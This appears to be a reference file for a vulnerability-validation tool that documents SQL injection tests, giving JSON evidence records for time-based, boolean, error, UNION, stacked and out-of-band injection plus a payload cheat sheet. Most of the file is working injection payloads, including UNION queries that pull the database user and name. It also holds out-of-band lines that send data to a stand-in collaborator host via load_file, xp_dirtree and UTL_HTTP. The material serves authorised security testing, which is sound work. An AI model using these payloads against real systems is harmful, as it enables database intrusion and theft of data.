# SQL Injection Examples

This file contains SQL injection examples (including blind SQLi) with evidence patterns.

## Table of Contents
1. [Time-Based Blind SQLi](#time-based-blind-sqli)
2. [Boolean-Based Blind SQLi](#boolean-based-blind-sqli)
3. [Error-Based SQLi](#error-based-sqli)
4. [UNION-Based SQLi](#union-based-sqli)
5. [Stacked Queries](#stacked-queries)
6. [Out-of-Band SQLi](#out-of-band-sqli)
7. [Test Result Types](#test-result-types)
8. [Common Payloads Reference](#common-payloads-reference)

---

## Time-Based Blind SQLi

**Scenario:** User lookup endpoint concatenates ID into SQL.

**Test:**
1. Baseline: `GET /api/users?id=5` → 200 OK (0.18s)
2. Payload: `GET /api/users?id=5' OR SLEEP(5)--` → 200 OK (5.34s)

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "sql_injection_time_based",
  "cwe": "CWE-89",
  "baseline": {
    "url": "http://target.com/api/users?id=5",
    "method": "GET",
    "status": 200,
    "response_time_seconds": 0.18,
    "response_hash": "sha256:aaa..."
  },
  "test": {
    "url": "http://target.com/api/users?id=5' OR SLEEP(5)--",
    "method": "GET",
    "status": 200,
    "response_time_seconds": 5.34,
    "response_hash": "sha256:bbb..."
  },
  "evidence": "Time-based SQLi: ~5s delay with SLEEP(5) payload",
  "payload_used": "5' OR SLEEP(5)--"
}
```

---

## Boolean-Based Blind SQLi

**Scenario:** Product search WHERE clause is concatenated.

**Test:**
1. True: `GET /api/products?category=toys' OR '1'='1` → returns all products (length 48,592)
2. False: `GET /api/products?category=toys' OR '1'='2` → returns category only (length 1,523)

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "sql_injection_boolean_based",
  "cwe": "CWE-89",
  "baseline": {
    "url": "http://target.com/api/products?category=toys",
    "status": 200,
    "content_length": 1523
  },
  "test": {
    "true_condition": {
      "url": "http://target.com/api/products?category=toys' OR '1'='1",
      "status": 200,
      "content_length": 48592
    },
    "false_condition": {
      "url": "http://target.com/api/products?category=toys' OR '1'='2",
      "status": 200,
      "content_length": 1523
    }
  },
  "evidence": "Boolean-based SQLi: true vs false condition length differs by 47069 bytes",
  "payload_used": {"true": "toys' OR '1'='1", "false": "toys' OR '1'='2"}
}
```

---

## Error-Based SQLi

**Scenario:** Login form returns raw DB errors.

**Test:**
1. Baseline: `POST /login` with `username=admin&password=test` → 401
2. Payload: `POST /login` with `username=admin'&password=test` → 500 + SQL error

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "sql_injection_error_based",
  "cwe": "CWE-89",
  "baseline": {
    "url": "http://target.com/login",
    "method": "POST",
    "status": 401,
    "response_snippet": "{\"error\":\"Invalid credentials\"}"
  },
  "test": {
    "url": "http://target.com/login",
    "method": "POST",
    "payload": "username=admin'&password=test",
    "status": 500,
    "response_snippet": "{\"error\":\"OperationalError: near 'admin': syntax error\"}"
  },
  "evidence": "Error-based SQLi: database syntax error exposed",
  "payload_used": "admin'"
}
```

---

## UNION-Based SQLi

**Scenario:** Search endpoint vulnerable to UNION after column count discovery.

**Test:**
1. `ORDER BY 3` → 200 OK; `ORDER BY 5` → 500 (columns = 4)
2. `UNION SELECT null,null,user(),database()` → returns DB/user info

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "sql_injection_union",
  "cwe": "CWE-89",
  "test": {
    "url": "http://target.com/search?q=test' UNION SELECT null,null,user(),database()--",
    "method": "GET",
    "status": 200,
    "response_snippet": "current_user: app@app-db, database: appdb"
  },
  "evidence": "UNION-based SQLi: extracted DB user and name",
  "payload_used": "test' UNION SELECT null,null,user(),database()--"
}
```

---

## Stacked Queries

**Scenario:** MSSQL endpoint permits stacked statements.

**Test:**
1. Baseline: `GET /api/report?id=7` → 200 (0.20s)
2. Payload: `GET /api/report?id=7; WAITFOR DELAY '0:0:5'--` → 200 (5.3s)

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "sql_injection_stacked",
  "cwe": "CWE-89",
  "baseline": {"response_time_seconds": 0.20},
  "test": {"response_time_seconds": 5.30},
  "evidence": "Stacked query delay via WAITFOR",
  "payload_used": "7; WAITFOR DELAY '0:0:5'--"
}
```

---

## Out-of-Band SQLi

**Scenario:** Database makes DNS lookup via injected function (authorized collaborator domain).

**Test:**
1. Payload: `test' UNION SELECT load_file(concat('\\\\',user(),'`.`',database(),'`.`collab.example.com\shared'))--`
2. Collaborator logs DNS query from DB host.

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "sql_injection_oob",
  "cwe": "CWE-89",
  "test": {
    "url": "http://target.com/api/search?q=test' UNION SELECT load_file(...)--",
    "method": "GET",
    "status": 200,
    "collaborator_hit": {
      "source_ip": "10.0.0.12",
      "record": "appdb.collab.example.com"
    }
  },
  "evidence": "OOB SQLi confirmed via collaborator DNS hit",
  "payload_used": "UNION SELECT load_file(...)"
}
```

---

## Test Result Types

### FALSE_POSITIVE (Properly Secured)

**Scenario:** Parameterized query prevents SQLi.

```json
{
  "status": "FALSE_POSITIVE",
  "injection_type": "sql_injection",
  "baseline": {"response_time_seconds": 0.12},
  "test": {"response_time_seconds": 0.14},
  "evidence": "No SQLi indicators; parameterized query"
}
```

### UNVALIDATED (WAF Blocking)

```json
{
  "status": "UNVALIDATED",
  "injection_type": "sql_injection",
  "reason": "WAF blocking injection payloads (403)",
  "test": {"status": 403},
  "evidence": "Cannot validate due to WAF"
}
```

### PARTIAL (Weak Signal)

```json
{
  "status": "PARTIAL",
  "injection_type": "sql_injection",
  "tests": {
    "sleep_payload": {"delay_seconds": 2.1},
    "boolean_payload": {"length_delta": 8}
  },
  "evidence": "Weak timing and minor length delta; needs manual review",
  "requires_manual_review": true
}
```

---

## Common Payloads Reference

**Time-Based:**
```
' OR SLEEP(5)--
'; SELECT pg_sleep(5)--
'; WAITFOR DELAY '0:0:5'--
1 AND 1=pg_sleep(5)
1 AND 1=1 /* heavy op for SQLite */
```

**Boolean-Based:**
```
' OR '1'='1
' OR '1'='2
1 OR 1=1
1 AND 1=2
```

**Error-Based:**
```
'
" 
1'1
1 AND 1=CONVERT(int,'a')--
' AND extractvalue(1,concat(0x7e,version()))--
```

**UNION/Stacked Probing:**
```
ORDER BY 3
ORDER BY 5
UNION SELECT null,null
UNION SELECT null,null,user(),database()
; SELECT pg_sleep(5)--
; WAITFOR DELAY '0:0:5'--
```

**Out-of-Band (authorized use only):**
```
UNION SELECT load_file('\\\\' || user() || '.collab.example.com\\a')
EXEC xp_dirtree '//collab.example.com/a'
UTL_HTTP.request('http://collab.example.com/' || user)
```
